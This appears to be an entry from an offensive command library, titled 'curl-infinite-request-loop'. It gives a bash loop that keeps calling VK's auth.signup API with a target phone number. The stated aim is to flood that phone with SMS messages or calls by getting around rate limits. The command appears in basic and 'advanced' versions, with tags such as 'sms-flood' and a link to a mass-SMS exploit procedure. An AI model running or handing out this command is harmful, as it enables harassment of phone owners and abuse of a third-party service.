---
id: g7h8i9j0-k1l2-3456-ghij-789012345678
data: >-
  while true; do curl -X POST 'https://api.vk.com/method/auth.signup' -d
  'phone=+12345678901&client_id=1&scope=notify&redirect_uri=https://oauth.vk.com/blank.html&v=5.131';
  sleep 0.5; done
tags:
  - sms-flood
  - infinite-loop
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:32:10.500Z'
verified: false
validated: true
submitted: true
---
# curl-infinite-request-loop

## Command

```bash
while true; do curl -X POST 'https://api.vk.com/method/auth.signup' -d 'phone=+12345678901&client_id=1&scope=notify&redirect_uri=https://oauth.vk.com/blank.html&v=5.131'; sleep 0.5; done
```

## Description

This infinite bash loop repeatedly calls the auth.signup API to flood a target phone with SMS/calls, exploiting the rate limit bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `while true` | Infinite loop condition | Yes |
| `curl ...` | API request | Yes |
| `sleep 0.5` | Delay between requests to avoid local overload | No |

## Examples

### Basic Usage

```bash
while true; do curl -X POST 'https://api.vk.com/method/auth.signup' -d 'phone=+12345678901&client_id=1&scope=notify&redirect_uri=https://oauth.vk.com/blank.html&v=5.131'; sleep 0.5; done
```

### Advanced Usage

```bash
while true; do curl -X POST 'https://api.vk.com/method/auth.signup' -d 'phone=+12345678901&client_id=1&scope=notify&redirect_uri=https://oauth.vk.com/blank.html&v=5.131' --silent; sleep 1; done
```

## Expected Output

Continuous JSON successes; target phone receives endless notifications until interrupted.

## Related

- [[Related Procedure|procedures/Exploit-API-for-Mass-SMS-and-Calls]]
